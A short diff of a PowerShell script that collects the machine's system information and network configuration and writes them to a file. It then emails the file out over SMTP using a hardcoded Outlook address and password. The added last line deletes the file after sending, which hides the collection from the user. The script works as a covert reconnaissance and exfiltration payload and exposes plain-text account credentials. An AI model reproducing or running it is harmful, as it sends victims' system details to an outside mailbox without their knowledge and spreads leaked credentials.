@@ -1,4 +1,4 @@
-﻿$value = Get-ComputerInfo
+$value = Get-ComputerInfo
 $ip = Get-NetIPConfiguration
 $value, $ip | Out-File -FilePath C:\Users\$env:UserName\Downloads\test.txt
 
@@ -15,3 +15,4 @@ $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPClient.EnableSsl = $true 
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("myansen039@outlook.com", "Root@roxx1"); 
 $SMTPClient.Send($smtpMessage)
+Remove-Item -Path C:\Users\$env:UserName\Downloads\test.txt
